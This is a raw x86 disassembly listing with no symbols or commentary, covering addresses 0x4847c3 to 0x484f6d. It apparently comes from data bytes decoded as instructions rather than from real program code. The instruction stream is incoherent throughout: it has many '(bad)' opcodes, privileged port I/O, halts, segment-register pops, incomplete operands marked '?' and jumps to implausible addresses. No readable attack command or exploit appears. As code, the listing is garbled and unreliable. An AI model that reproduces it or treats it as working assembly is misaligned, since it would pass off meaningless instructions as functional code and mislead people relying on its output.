  4847c3:	cmp    BYTE PTR [edx],bl
  4847c5:	mov    bl,0x4f
  4847c7:	adc    al,0xa6
  4847c9:	jb     0x4847d2
  4847cb:	push   ds
  4847cc:	clc    
  4847cd:	test   BYTE PTR [eax+0xa],dh
  4847d0:	xor    bl,BYTE PTR [eax]
  4847d2:	add    al,0x5e
  4847d4:	bound  ebp,QWORD PTR [esi+0x759a4bc4]
  4847da:	pusha  
  4847db:	sbb    edi,ecx
  4847dd:	js     0x4847d6
  4847df:	mov    eax,0x861e180d
  4847e4:	inc    esi
  4847e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4847e6:	xchg   ecx,eax
  4847e7:	aas    
  4847e8:	dec    eax
  4847e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4847ea:	mov    ah,0xd1
  4847ec:	mov    bh,0xd3
  4847ee:	mov    al,ds:0x5b432470
  4847f3:	enter  0x710f,0xb1
  4847f7:	add    DWORD PTR [edi-0x68],ecx
  4847fa:	outs   dx,BYTE PTR ds:[esi]
  4847fb:	push   edi
  4847fc:	jb     0x484823
  4847fe:	inc    eax
  4847ff:	rcr    BYTE PTR [edi-0x44a91bfe],0x48
  484806:	call   0x46d9e75a
  48480b:	cwde   
  48480c:	je     0x48487d
  48480e:	dec    edx
  48480f:	or     bl,dl
  484811:	mov    al,BYTE PTR [esi+0x46]
  484814:	push   edi
  484815:	adc    BYTE PTR [edx-0x39],0x80
  484819:	(bad)  
  48481a:	fcomp  QWORD PTR [edx]
  48481c:	imul   ebx,DWORD PTR [ebp+0x2704d85c],0x474a3e41
  484826:	dec    ebx
  484827:	fs pop ebx
  484829:	cmp    DWORD PTR [ebx-0x74],0x7b91843e
  484830:	sub    dl,cl
  484832:	arpl   WORD PTR [esi],dx
  484834:	mov    dl,BYTE PTR ds:0xec0f7a1d
  48483a:	daa    
  48483b:	mov    cs:0x5ac3a293,al
  484841:	aam    0x1f
  484843:	push   ecx
  484844:	ror    BYTE PTR [ebp-0x7a],1
  484847:	pop    eax
  484848:	fistp  DWORD PTR [esi]
  48484a:	dec    esi
  48484b:	or     BYTE PTR [ecx+0x9],al
  48484e:	mov    edi,0x7214cb92
  484853:	loop   0x484839
  484855:	loopne 0x48485d
  484857:	dec    esp
  484858:	adc    edx,ebx
  48485a:	mov    bl,0x22
  48485c:	xor    DWORD PTR [esi+0x2b999149],ebp
  484862:	rcr    DWORD PTR [edi-0x18],cl
  484865:	xchg   DWORD PTR [eax+ecx*4+0x334b5d8e],ebx
  48486c:	rcl    BYTE PTR [edx+ebp*8-0x20],cl
  484870:	sub    DWORD PTR [eax+0x1c],0xd4fdb23b
  484877:	inc    edi
  484878:	pushf  
  484879:	or     ah,al
  48487b:	pop    es
  48487c:	pop    ebp
  48487d:	call   esp
  48487f:	pop    es
  484880:	mov    ds:0x58221d26,eax
  484885:	adc    ah,bh
  484887:	enter  0x2b44,0x24
  48488b:	gs stos DWORD PTR es:[edi],eax
  48488d:	jmp    0x48485c
  48488f:	or     al,0x3c
  484891:	mov    ds:0x80c8159f,al
  484896:	out    dx,eax
  484897:	out    0x76,al
  484899:	sub    al,0x8a
  48489b:	outs   dx,DWORD PTR ds:[esi]
  48489c:	add    eax,DWORD PTR [edi+0x3f]
  48489f:	xor    esi,DWORD PTR [eax+0x6f022190]
  4848a5:	pop    eax
  4848a6:	retf   0x8221
  4848a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4848aa:	jne    0x4848c4
  4848ac:	mov    ebp,0x3a0b8d83
  4848b1:	mov    edx,0x360f1b5a
  4848b6:	shl    al,cl
  4848b8:	pop    esi
  4848b9:	scas   al,BYTE PTR es:[edi]
  4848ba:	add    al,0x0
  4848bc:	inc    ebx
  4848bd:	mov    BYTE PTR [esi],cl
  4848bf:	add    edi,DWORD PTR [ebp+0x6308b422]
  4848c5:	inc    esp
  4848c6:	jne    0x4848d1
  4848c8:	dec    edx
  4848c9:	pop    eax
  4848ca:	dec    ebp
  4848cb:	shl    DWORD PTR ds:0x80bb139d,0x35
  4848d2:	das    
  4848d3:	not    esp
  4848d5:	sbb    bh,BYTE PTR [ecx+0x58]
  4848d8:	jl     0x4848f0
  4848da:	mov    BYTE PTR [esi-0x58],0x72
  4848de:	mov    ch,0x54
  4848e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4848e1:	xor    BYTE PTR [ecx-0x3a],bl
  4848e4:	pop    edi
  4848e5:	add    eax,0xc35eb09d
  4848ea:	ret    
  4848eb:	pop    esi
  4848ec:	outs   dx,DWORD PTR ds:[esi]
  4848ed:	mov    ax,ds:0x9872e0fc
  4848f3:	test   BYTE PTR [edi],ah
  4848f5:	ja     0x4848f7
  4848f7:	sub    BYTE PTR [esi+0x65],bh
  4848fa:	jmp    0x48489b
  4848fc:	mov    eax,0x508b7422
  484901:	add    BYTE PTR ds:0xed48533b,cl
  484907:	push   ebx
  484908:	push   es
  484909:	int3   
  48490a:	mov    WORD PTR [eax],cs
  48490c:	(bad)  
  48490d:	adc    ah,BYTE PTR [esi]
  48490f:	adc    al,0x91
  484911:	jbe    0x48490c
  484913:	cmp    al,0xb
  484915:	jle    0x48491d
  484917:	adc    al,0x4a
  484919:	or     BYTE PTR [ecx],bl
  48491b:	test   eax,0x4c4c9534
  484920:	or     BYTE PTR [eax],dl
  484922:	dec    esp
  484923:	and    edi,esi
  484925:	xor    BYTE PTR [esi+0x26],cl
  484928:	xlat   BYTE PTR ds:[ebx]
  484929:	je     0x484953
  48492b:	shl    DWORD PTR [edi+0x1f715c29],0x62
  484932:	push   ebp
  484933:	add    al,0x75
  484935:	bound  ecx,QWORD PTR ds:0x186109c1
  48493b:	add    DWORD PTR [ecx+eiz*4],edx
  48493e:	xchg   esi,eax
  48493f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  484940:	mov    esi,0x79b0d86
  484945:	jbe    0x484957
  484947:	js     0x484993
  484949:	arpl   WORD PTR [ebp+0x5b],si
  48494c:	clc    
  48494d:	add    DWORD PTR [edx+eax*1-0x7d],esi
  484951:	push   es
  484952:	mov    WORD PTR [ecx+ebx*1-0x68],?
  484956:	stos   DWORD PTR es:[edi],eax
  484957:	fld    QWORD PTR [ebx]
  484959:	les    edx,FWORD PTR [edi]
  48495b:	push   eax
  48495c:	inc    eax
  48495d:	loop   0x484928
  48495f:	mov    es,WORD PTR [eax-0x3cc7fadb]
  484965:	lods   al,BYTE PTR ds:[esi]
  484966:	not    BYTE PTR [ecx]
  484968:	adc    BYTE PTR [edi+0x7c],ch
  48496b:	lgs    ebp,FWORD PTR [esi+0x1d]
  48496f:	ins    BYTE PTR es:[edi],dx
  484970:	daa    
  484971:	pop    edx
  484972:	ins    BYTE PTR es:[edi],dx
  484973:	and    eax,DWORD PTR [ebx-0x6b6f8986]
  484979:	inc    ebx
  48497a:	mov    WORD PTR [edx+0x535b136d],es
  484980:	pusha  
  484981:	mov    esi,0x1d7030ca
  484986:	or     al,0x74
  484988:	fistp  WORD PTR [eax]
  48498a:	add    dh,BYTE PTR [edi-0x3cce9f9f]
  484990:	pop    ds
  484991:	leave  
  484992:	pushf  
  484993:	aaa    
  484994:	or     cl,BYTE PTR [edx+0x70575f56]
  48499a:	lds    edi,FWORD PTR [edx]
  48499c:	mov    eax,ds:0xbca73231
  4849a1:	xor    al,0xf2
  4849a3:	popa   
  4849a4:	test   DWORD PTR [ebp-0x77abbc16],edi
  4849aa:	mov    WORD PTR [esi],ss
  4849ac:	pop    edi
  4849ad:	mov    ds:0x538a064b,al
  4849b2:	add    al,0x89
  4849b4:	loop   0x484a27
  4849b6:	sbb    eax,0x96a2652
  4849bb:	mov    ebx,0x404f77c4
  4849c0:	sub    dh,BYTE PTR [ebp+eiz*4+0x16]
  4849c4:	rcl    ecx,1
  4849c6:	mov    eax,DWORD PTR [edi-0x1f]
  4849c9:	xchg   esp,eax
  4849ca:	(bad)  
  4849cb:	mov    WORD PTR [edi],?
  4849cd:	mov    esi,0xb6260a5
  4849d2:	dec    edi
  4849d3:	or     eax,0xc2200d68
  4849d8:	and    DWORD PTR [edx+0x75],esp
  4849db:	pop    es
  4849dc:	fld    QWORD PTR [edi]
  4849de:	xadd   BYTE PTR ds:0x80039a57,bl
  4849e5:	mov    dl,BYTE PTR [ebx]
  4849e7:	pop    ds
  4849e8:	cmp    BYTE PTR [ebx],al
  4849ea:	int    0x87
  4849ec:	std    
  4849ed:	mov    al,0x24
  4849ef:	(bad)  
  4849f1:	xor    al,BYTE PTR [ebx-0x5aa61001]
  4849f7:	pusha  
  4849f8:	cmp    edi,DWORD PTR [ecx-0x3]
  4849fb:	push   esp
  4849fc:	push   0xce59ee1d
  484a01:	or     eax,0x565fbebd
  484a06:	in     al,dx
  484a07:	aas    
  484a08:	mov    edx,DWORD PTR [eax+0x12bb7185]
  484a0e:	fisttp QWORD PTR [ecx+0x56]
  484a11:	ds je  0x484a5a
  484a14:	loop   0x4849f6
  484a16:	mov    DWORD PTR [edx-0x71],0xc1500f4f
  484a1d:	(bad)  
  484a1e:	or     al,0xfc
  484a20:	ins    BYTE PTR es:[edi],dx
  484a21:	ret    0x13ba
  484a24:	jg     0x484a55
  484a26:	iret   
  484a27:	ret    0xc921
  484a2a:	adc    al,0x4a
  484a2c:	iret   
  484a2d:	js     0x484a4f
  484a2f:	xor    DWORD PTR [eax+0x67],edx
  484a32:	inc    esi
  484a33:	xor    BYTE PTR [ebp+0x58b53c7d],0x3c
  484a3a:	pop    esp
  484a3b:	adc    eax,0xabb0c4f4
  484a40:	(bad)  [eax+0x27]
  484a43:	or     eax,0x91a009a3
  484a48:	mov    eax,ds:0xcd7a4708
  484a4d:	mov    eax,ds
  484a4f:	pusha  
  484a50:	inc    esi
  484a51:	xor    esi,ebx
  484a53:	hlt    
  484a54:	lock adc edx,eax
  484a57:	xor    esp,0xfffffff6
  484a5a:	and    ah,ch
  484a5c:	sub    ebx,DWORD PTR [ebx]
  484a5e:	idiv   BYTE PTR [edx+edi*8-0x7f]
  484a62:	sbb    esi,DWORD PTR [esi-0x28]
  484a65:	sub    ecx,DWORD PTR [ebp-0xa]
  484a68:	ror    BYTE PTR [edi+esi*2],0x4
  484a6c:	cs adc al,0x88
  484a6f:	loopne 0x484a84
  484a71:	cld    
  484a72:	push   eax
  484a73:	outs   dx,DWORD PTR ds:[esi]
  484a74:	ret    
  484a75:	and    dl,0xbe
  484a78:	push   eax
  484a79:	inc    esp
  484a7a:	or     BYTE PTR [eax-0x22],al
  484a7d:	cdq    
  484a7e:	jb     0x484a62
  484a80:	cmp    eax,0x301e486a
  484a85:	cmovge esp,DWORD PTR [eax]
  484a88:	mov    eax,ds:0x1b083b1d
  484a8d:	push   esi
  484a8e:	es aam 0x8d
  484a91:	pop    eax
  484a92:	test   BYTE PTR [eax+0x3072f048],ch
  484a98:	inc    ebp
  484a99:	bound  esi,QWORD PTR [ebx]
  484a9b:	or     ah,BYTE PTR [eax+0x1a422b0e]
  484aa1:	in     eax,dx
  484aa2:	ins    DWORD PTR es:[edi],dx
  484aa3:	jno    0x484aad
  484aa5:	loopne 0x484a3f
  484aa7:	hlt    
  484aa8:	or     eax,DWORD PTR [ebx]
  484aaa:	dec    esi
  484aab:	dec    eax
  484aac:	push   0x2b
  484aae:	mov    al,0x14
  484ab0:	out    dx,al
  484ab1:	mov    eax,0x34456cc
  484ab6:	add    al,0x2b
  484ab8:	push   ebp
  484ab9:	cld    
  484aba:	mov    ah,dh
  484abc:	mov    eax,ds:0x53ee1206
  484ac1:	push   ebp
  484ac2:	loopne 0x484ac7
  484ac4:	lods   eax,DWORD PTR ds:[esi]
  484ac5:	xchg   ebx,eax
  484ac6:	sahf   
  484ac7:	imul   eax,DWORD PTR [edi+ecx*1],0x630118d
  484ace:	ins    DWORD PTR es:[edi],dx
  484acf:	loop   0x484b1f
  484ad1:	pusha  
  484ad2:	add    bh,BYTE PTR ds:0xe0094f12
  484ad8:	inc    ebp
  484ad9:	add    bl,BYTE PTR [edi+0x14]
  484adc:	sbb    dl,BYTE PTR [eax+0x59]
  484adf:	add    BYTE PTR [ecx+0x5e0d92b],cl
  484ae5:	push   eax
  484ae6:	xor    al,0x29
  484ae8:	and    ch,BYTE PTR [ecx]
  484aea:	mov    bl,0x16
  484aec:	ja     0x484b1b
  484aee:	lods   al,BYTE PTR ds:[esi]
  484aef:	mov    BYTE PTR [edx],dh
  484af1:	adc    bl,BYTE PTR [eax-0x41]
  484af4:	test   BYTE PTR [edi+0x58],al
  484af7:	int    0x85
  484af9:	push   ds
  484afa:	inc    edx
  484afb:	mov    edi,0x33624ed6
  484b00:	(bad)  
  484b01:	and    eax,0xbc831a30
  484b06:	mov    edx,0xe3c72c2e
  484b0b:	or     edi,eax
  484b0d:	add    BYTE PTR [edi+ecx*1],bh
  484b10:	test   BYTE PTR [eax+0x15e3279d],ah
  484b16:	mov    DWORD PTR [ebx-0x45],ecx
  484b19:	leave  
  484b1a:	cld    
  484b1b:	mov    ds:0xccda4dd0,eax
  484b20:	push   ds
  484b21:	clc    
  484b22:	fst    QWORD PTR [esi+0x1b]
  484b25:	lods   al,BYTE PTR ds:[esi]
  484b26:	fwait
  484b27:	lods   eax,DWORD PTR ds:[esi]
  484b28:	ret    0x5720
  484b2b:	fs sub eax,0xa4d86890
  484b31:	cmp    ah,BYTE PTR [ebx]
  484b33:	fst    DWORD PTR [eax+0x3c]
  484b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  484b37:	bound  edx,QWORD PTR [edi+0x6a]
  484b3a:	ror    BYTE PTR [edi],cl
  484b3c:	ret    0x4504
  484b3f:	fs cmp DWORD PTR es:[esi-0x232efa80],0x57
  484b48:	or     DWORD PTR [ebp+0x7c6a1186],0xdb812cb7
  484b52:	lahf   
  484b53:	xor    al,0x6
  484b55:	cmp    BYTE PTR [esi+0x57],0x5c
  484b59:	or     eax,0xede2978a
  484b5e:	push   ecx
  484b5f:	clc    
  484b60:	and    al,0xc7
  484b62:	sub    BYTE PTR [eax+0x66],0x64
  484b66:	and    ah,BYTE PTR [ecx]
  484b68:	and    al,0x1a
  484b6a:	xchg   esp,eax
  484b6b:	add    DWORD PTR [esi],ecx
  484b6d:	inc    edi
  484b6e:	les    esp,FWORD PTR [esp+ebx*4]
  484b71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  484b72:	sub    eax,0x244410ee
  484b77:	inc    esi
  484b78:	and    BYTE PTR [ecx+0x28],bh
  484b7b:	xchg   ecx,eax
  484b7c:	xor    eax,0x94c5432c
  484b81:	jno    0x484bd0
  484b83:	das    
  484b84:	cmp    al,0x8
  484b86:	jg     0x288f5f00
  484b8c:	(bad)  
  484b8d:	sub    edx,DWORD PTR [edi]
  484b8f:	push   0xffffffd5
  484b91:	dec    eax
  484b92:	inc    eax
  484b93:	mov    eax,ds:0x465de780
  484b98:	inc    edi
  484b99:	mov    eax,ds:0xc6056cda
  484b9e:	stc    
  484b9f:	push   0x21848669
  484ba4:	aas    
  484ba5:	cs xchg edx,eax
  484ba7:	mov    esp,esp
  484ba9:	sub    BYTE PTR [eax],bh
  484bab:	xor    ah,ah
  484bad:	and    bh,BYTE PTR [ecx-0x33f7bbb8]
  484bb3:	call   0xdd09f805
  484bb8:	sti    
  484bb9:	adc    DWORD PTR [eax+esi*2+0x72d01672],ecx
  484bc0:	out    dx,eax
  484bc1:	adc    edx,eax
  484bc3:	sub    BYTE PTR [ebp+0x209571b5],al
  484bc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  484bca:	out    0x53,eax
  484bcc:	sub    eax,0xc7202d23
  484bd1:	aaa    
  484bd2:	(bad)  
  484bd3:	cwde   
  484bd4:	push   edx
  484bd5:	push   eax
  484bd6:	mov    bl,BYTE PTR [edx]
  484bd8:	mov    ds:0xfffeb60a,eax
  484bdd:	ret    
  484bde:	and    dl,BYTE PTR [ebx+0x2eec2da8]
  484be4:	popf   
  484be5:	sbb    esp,eax
  484be7:	push   0xe1237737
  484bec:	pop    ss
  484bed:	daa    
  484bee:	ror    eax,0x22
  484bf1:	adc    eax,ebp
  484bf3:	mov    bh,bh
  484bf5:	push   0xb38d68bc
  484bfa:	xor    DWORD PTR [ebx-0x12ff386d],0xffffffa2
  484c01:	pusha  
  484c02:	adc    ecx,DWORD PTR [ecx+0x410943c9]
  484c08:	(bad)  
  484c09:	pop    ds
  484c0a:	add    ebp,DWORD PTR [esi]
  484c0c:	inc    ebx
  484c0d:	pop    esi
  484c0e:	inc    edi
  484c0f:	mov    al,0x2
  484c11:	jmp    DWORD PTR [esi+0x3c]
  484c14:	retf   
  484c15:	jp     0x484ba9
  484c17:	inc    esi
  484c18:	and    DWORD PTR [ecx+0x97e823],edx
  484c1e:	inc    esp
  484c1f:	or     ch,bl
  484c21:	dec    esi
  484c22:	mov    bh,0x8d
  484c24:	dec    ecx
  484c25:	loop   0x484c03
  484c27:	sbb    al,0xd8
  484c29:	cmp    BYTE PTR [esi+ebx*8],dl
  484c2c:	inc    esi
  484c2d:	and    al,0x11
  484c2f:	not    BYTE PTR [eax]
  484c31:	mov    BYTE PTR [ecx+0x5e],cl
  484c34:	ja     0x484c8a
  484c36:	mov    ebp,0xc82f8f5d
  484c3b:	icebp  
  484c3c:	xor    BYTE PTR [eax+0x48],0x78
  484c40:	hlt    
  484c41:	xchg   BYTE PTR [ebx+0x7f4c1665],dl
  484c47:	pop    es
  484c48:	mov    bl,0x3
  484c4a:	lock cli 
  484c4c:	sbb    eax,0xe91e148b
  484c51:	inc    esp
  484c52:	jg     0x484c58
  484c54:	mov    bl,0x4
  484c56:	jmp    0x484cd1
  484c58:	mov    bh,0x8a
  484c5a:	js     0x484c5b
  484c5c:	add    al,0x88
  484c5e:	push   ss
  484c5f:	add    ebx,ebp
  484c61:	ins    DWORD PTR es:[edi],dx
  484c62:	cmp    edi,edx
  484c64:	push   cs
  484c65:	add    cl,BYTE PTR [eax]
  484c67:	test   eax,0xeaa20ea4
  484c6c:	push   ss
  484c6d:	adc    DWORD PTR [ebx],ebp
  484c6f:	cmp    DWORD PTR [ebx-0x62],0x740adbf0
  484c76:	or     al,0x9b
  484c78:	and    eax,0x9426bcf0
  484c7d:	sub    al,0x18
  484c7f:	sub    al,0x14
  484c81:	mov    eax,0xde79b9e7
  484c86:	xor    BYTE PTR [eax],bl
  484c88:	xor    BYTE PTR [esp+edi*2],bl
  484c8b:	and    al,0x34
  484c8d:	xor    al,0x8f
  484c8f:	adc    BYTE PTR [esi],dl
  484c91:	shl    BYTE PTR [ebx+ebx*4],0x7e
  484c95:	sar    ebx,cl
  484c97:	add    eax,0xdec675d4
  484c9c:	call   0x74905929
  484ca1:	or     eax,0xdef64b04
  484ca6:	jbe    0x484cb6
  484ca8:	jmp    0x484cb8
  484caa:	bnd jmp 0x484cb7
  484cad:	in     al,0x6
  484caf:	aam    0x2
  484cb1:	int3   
  484cb2:	test   BYTE PTR [ebp+0x46],al
  484cb5:	and    ebp,DWORD PTR [ebx+0x11dc475d]
  484cbb:	xor    ebx,esp
  484cbd:	push   edi
  484cbe:	sbb    cl,dh
  484cc0:	pop    eax
  484cc1:	test   al,0x23
  484cc3:	(bad)  
  484cc4:	ins    BYTE PTR es:[edi],dx
  484cc5:	lods   al,BYTE PTR ds:[esi]
  484cc6:	and    al,0x1b
  484cc8:	mov    ebx,0x3b891c80
  484ccd:	sbb    dh,BYTE PTR [esi]
  484ccf:	shl    WORD PTR [ecx+ecx*8-0x4c],0x2b
  484cd5:	call   0x69a952a
  484cda:	dec    esp
  484cdb:	in     al,dx
  484cdc:	push   eax
  484cdd:	dec    esp
  484cde:	nop
  484cdf:	inc    edx
  484ce0:	dec    esp
  484ce1:	xlat   BYTE PTR ds:[ebx]
  484ce2:	daa    
  484ce3:	out    dx,al
  484ce4:	mov    al,ds:0x95da3120
  484ce9:	sbb    ch,al
  484ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  484cec:	or     BYTE PTR [ebp+0x2f8aab2],0x8b
  484cf3:	pop    ss
  484cf4:	je     0x484d25
  484cf6:	sahf   
  484cf7:	jecxz  0x484cf6
  484cf9:	jmp    0x484d06
  484cfb:	sbb    eax,0x83033601
  484d00:	retf   
  484d01:	add    dh,BYTE PTR [ebp+0x41]
  484d04:	mov    bh,0xe0
  484d06:	icebp  
  484d07:	pop    ds
  484d08:	mov    BYTE PTR [ebx],cl
  484d0a:	mov    al,0x27
  484d0c:	adc    ch,BYTE PTR [ebx-0x35]
  484d0f:	je     0x484d48
  484d11:	push   edi
  484d12:	pop    es
  484d13:	out    0xf0,al
  484d15:	hlt    
  484d16:	pop    ss
  484d17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  484d18:	push   esi
  484d19:	sbb    edi,edi
  484d1b:	pminub mm1,QWORD PTR ds:0xbfd3480b
  484d22:	sbb    eax,0x652d2cc0
  484d27:	add    ch,BYTE PTR [esi+0x38]
  484d2a:	or     dl,BYTE PTR [eax]
  484d2c:	pop    es
  484d2d:	jae    0x484d52
  484d2f:	js     0x484da5
  484d31:	pop    es
  484d32:	sub    eax,eax
  484d34:	jne    0x484cb6
  484d36:	inc    esi
  484d37:	xchg   esp,edx
  484d39:	xor    BYTE PTR [ebx+0x1a],cl
  484d3c:	push   edx
  484d3d:	je     0x484dab
  484d3f:	jp     0x484d59
  484d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  484d42:	rcr    DWORD PTR [esi+0xa],0xa0
  484d46:	js     0x484cd9
  484d48:	adc    BYTE PTR ds:0x40f3d5f4,dl
  484d4e:	and    bh,bh
  484d50:	sbb    eax,0xca4d2d69
  484d55:	inc    ebp
  484d56:	imul   ebx,DWORD PTR ds:0x8dd21384,0xeb118a94
  484d60:	cmp    al,0x95
  484d62:	adc    BYTE PTR ss:[eax],cl
  484d65:	xchg   ebx,eax
  484d66:	sbb    DWORD PTR [ebp+0x889dc9c],ebx
  484d6c:	sbb    al,0x8b
  484d6e:	(bad)  
  484d6f:	sbb    al,0x75
  484d71:	jno    0x484d7b
  484d73:	adc    cl,BYTE PTR [ebx+0x400058c3]
  484d79:	xchg   DWORD PTR ds:0xe6513da0,ebx
  484d7f:	fadd   DWORD PTR [ecx+ebp*1]
  484d82:	dec    ebp
  484d83:	fldcw  WORD PTR [esi+0xc]
  484d86:	and    BYTE PTR [edx],0x5d
  484d89:	cmovo  eax,DWORD PTR [edi+0x6c]
  484d8d:	xor    eax,0xbd0dc8d6
  484d92:	add    eax,0x7b804c0b
  484d97:	popa   
  484d98:	xchg   BYTE PTR [eax+0x292fa0d4],ch
  484d9e:	pushf  
  484d9f:	mov    DWORD PTR [eax+0x11de92a3],esp
  484da5:	inc    ebp
  484da6:	sbb    ah,BYTE PTR [eax-0x73136dc]
  484dac:	aam    0x6a
  484dae:	mov    dl,0x24
  484db0:	les    ecx,FWORD PTR [edi+0x78]
  484db3:	dec    DWORD PTR [edi]
  484db5:	fbld   TBYTE PTR [ebp+0x8]
  484db8:	inc    ecx
  484db9:	inc    eax
  484dba:	mov    DWORD PTR [ebp+0x2b],0xe25c88e
  484dc1:	or     al,ch
  484dc3:	aad    0x26
  484dc5:	(bad)  
  484dc6:	add    DWORD PTR [eax],eax
  484dc8:	xchg   ebx,eax
  484dc9:	sub    al,0x31
  484dcb:	hlt    
  484dcc:	mov    WORD PTR [edx-0x6d],cs
  484dcf:	push   es
  484dd0:	xor    dl,BYTE PTR ds:0xead8d0e2
  484dd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  484dd7:	sbb    eax,0x113483b9
  484ddc:	xor    BYTE PTR [eax],al
  484dde:	test   al,0x8d
  484de0:	adc    al,0xaf
  484de2:	ins    BYTE PTR es:[edi],dx
  484de3:	addr16 mov al,0x12
  484de6:	pop    es
  484de7:	mul    DWORD PTR [ebp-0x5f555b17]
  484ded:	jne    0x484e09
  484def:	(bad)  
  484df0:	pop    eax
  484df1:	and    BYTE PTR [edi*2+0x335ff577],ch
  484df8:	push   cs
  484df9:	inc    edx
  484dfa:	in     eax,dx
  484dfb:	and    bl,al
  484dfd:	inc    ebx
  484dfe:	inc    edx
  484dff:	mov    edx,0x7e410d2f
  484e04:	lea    ebp,[esi+0x45]
  484e07:	bound  edi,QWORD PTR [eax+0x32]
  484e0a:	pusha  
  484e0b:	loope  0x484dac
  484e0d:	sbb    bl,BYTE PTR ds:0x685360ed
  484e13:	sbb    al,0x4c
  484e15:	inc    ebx
  484e16:	popa   
  484e17:	lea    eax,[eax]
  484e19:	dec    esp
  484e1a:	xchg   ebx,eax
  484e1b:	cmp    DWORD PTR [edx-0x3b17f4aa],0xffffff83
  484e22:	mov    bl,0x70
  484e24:	cmc    
  484e25:	jo     0x484df8
  484e27:	aaa    
  484e28:	icebp  
  484e29:	pop    ds
  484e2a:	jae    0x484de8
  484e2c:	mov    BYTE PTR [ebx-0x4538dd57],0x11
  484e33:	dec    edi
  484e34:	cmp    eax,DWORD PTR [ebx]
  484e36:	jge    0x484e38
  484e38:	and    BYTE PTR [ebx+eax*1-0x2de0ed9a],al
  484e3f:	or     dh,cl
  484e41:	adc    DWORD PTR [edx-0x6c],edi
  484e44:	or     BYTE PTR [edi-0x23],bh
  484e47:	or     DWORD PTR [eax+0x1deb2d22],0x18
  484e4e:	rol    DWORD PTR [eax+edi*2+0x4],cl
  484e52:	adc    esp,0xffffffb0
  484e55:	loopne 0x484e94
  484e57:	clc    
  484e58:	jge    0x484e0a
  484e5a:	and    DWORD PTR [eax+0x76],esp
  484e5d:	dec    ebx
  484e5e:	mov    al,ds:0x83882ca0
  484e63:	(bad)  
  484e64:	fmul   QWORD PTR [eax+0x7b]
  484e67:	ficom  DWORD PTR [esi]
  484e69:	and    ah,BYTE PTR [ebx+0x2]
  484e6c:	retf   0x6864
  484e6f:	or     eax,0x36e31150
  484e74:	cdq    
  484e75:	sub    eax,ebp
  484e77:	ins    DWORD PTR es:[edi],dx
  484e78:	mov    esp,fs
  484e7a:	jg     0x484eae
  484e7c:	shl    DWORD PTR [esp+ebp*1],cl
  484e7f:	es jne 0x484edb
  484e82:	addr16 js 0x484e07
  484e85:	pop    eax
  484e86:	xchg   ebp,eax
  484e87:	(bad)
  484e8b:	or     ebp,DWORD PTR [si-0x4280]
  484e90:	test   al,0x43
  484e92:	mov    BYTE PTR [ebp+0x7879e0b3],0x11
  484e99:	vandps xmm0,xmm4,XMMWORD PTR ss:[ebp+0x25f6717c]
  484ea2:	test   BYTE PTR [edi+0x26157885],dh
  484ea8:	xor    BYTE PTR [esi+0x67],bh
  484eab:	pop    eax
  484eac:	inc    ecx
  484ead:	in     al,0xd4
  484eaf:	dec    esp
  484eb0:	jnp    0x484eb5
  484eb2:	das    
  484eb3:	dec    esp
  484eb4:	cmp    DWORD PTR [ebp-0x7da0cc80],0x5d
  484ebb:	or     bl,BYTE PTR [esi]
  484ebd:	jmp    0xf015:0xa2ac33ac
  484ec4:	xor    DWORD PTR [ecx+edx*1+0x1f4a862b],ecx
  484ecb:	mov    dh,0x80
  484ecd:	(bad)  
  484ecf:	push   eax
  484ed0:	mov    al,ds:0x41b869d7
  484ed5:	fisubr DWORD PTR [ecx-0x1d]
  484ed8:	and    eax,0xc8d57555
  484edd:	jo     0x484e68
  484edf:	ret    
  484ee0:	ret    0x1469
  484ee3:	mov    WORD PTR [edi+0x7a],ds
  484ee6:	dec    ecx
  484ee7:	ret    0x2b06
  484eea:	out    dx,al
  484eeb:	cmp    BYTE PTR [edi-0x3b],bh
  484eee:	xchg   ecx,eax
  484eef:	cs dec ebx
  484ef1:	dec    ecx
  484ef2:	mov    bh,0x4a
  484ef4:	cmp    al,0x53
  484ef6:	movlps xmm7,QWORD PTR [eax-0x3d5f3a64]
  484efd:	inc    esp
  484efe:	inc    esp
  484eff:	add    ebx,ebx
  484f01:	hlt    
  484f02:	sbb    DWORD PTR [ecx],ebx
  484f04:	xchg   ebx,eax
  484f05:	xchg   edi,eax
  484f06:	es cmp al,0x34
  484f09:	imul   esi,DWORD PTR [ebx+0x42],0x2659c21a
  484f10:	int    0xf4
  484f12:	in     eax,0xe8
  484f14:	ins    BYTE PTR es:[edi],dx
  484f15:	or     bl,dl
  484f17:	mov    edi,DWORD PTR [esi+0x6]
  484f1a:	(bad)  
  484f1b:	into   
  484f1c:	mov    bh,0x80
  484f1e:	xor    BYTE PTR [ecx-0x12],cl
  484f21:	mov    dl,0x98
  484f23:	push   ecx
  484f24:	pop    ss
  484f25:	nop
  484f26:	repz jle 0x484fa5
  484f29:	(bad)  
  484f2b:	jne    0x484f53
  484f2d:	mov    dh,0xd5
  484f2f:	pop    esi
  484f30:	jge    0x484f2a
  484f32:	xor    dl,BYTE PTR [si-0x7fce]
  484f37:	pop    ebx
  484f38:	mov    bh,0xac
  484f3a:	shr    DWORD PTR [edi+0x1c],cl
  484f3d:	or     edx,DWORD PTR es:[eax-0x1a]
  484f41:	mov    esi,esp
  484f43:	sbb    DWORD PTR [ecx],edi
  484f45:	mov    eax,es
  484f47:	sti    
  484f48:	add    esp,DWORD PTR [esi+0x1c]
  484f4b:	inc    esi
  484f4c:	out    0x19,eax
  484f4e:	inc    ebx
  484f4f:	xor    al,0x5
  484f51:	loopne 0x484f64
  484f53:	and    edx,edi
  484f55:	nop
  484f56:	lea    edi,[esi]
  484f58:	mov    al,BYTE PTR [edi+0x7fec2c03]
  484f5e:	mov    WORD PTR [esi+ecx*4],?
  484f61:	mov    ebp,0xf02952d8
  484f66:	pushf  
  484f67:	lahf   
  484f68:	xchg   ebx,eax
  484f69:	loop   0x484f97
  484f6b:	in     al,dx
  484f6c:	pop    ebx
  484f6d:	pop    ecx
